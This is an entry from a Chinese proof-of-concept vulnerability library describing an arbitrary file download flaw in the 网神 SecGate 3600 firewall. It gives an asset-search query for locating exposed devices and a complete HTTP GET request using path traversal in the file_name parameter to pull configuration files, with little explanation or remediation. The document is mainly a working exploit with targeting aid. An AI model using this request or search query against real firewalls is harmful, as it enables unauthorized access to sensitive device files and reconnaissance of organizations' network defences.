---
fofa: "app.name="
source: "wy876 漏洞文库"
---

# 网神SecGata 3600防火墙存在任意文件下载漏洞

# 一、漏洞简介
网神SecGata 3600防火墙存在任意文件下载漏洞

# 二、影响版本
+ 网神SecGata 3600防火墙

# 三、资产测绘
+ hunter`app.name="网神 SecGate"`
+ 特征


# 四、漏洞复现
```plain
GET /?g=sys_export_conf_local_save&file_name=../modules/system/import_export.mds HTTP/1.1
Host: xx.xx.xx.xx
Cookie: __s_sessionid__=5543sd9rcbiklqs1ttignkqvt6
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bql4k8u8x1l3ar5t>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
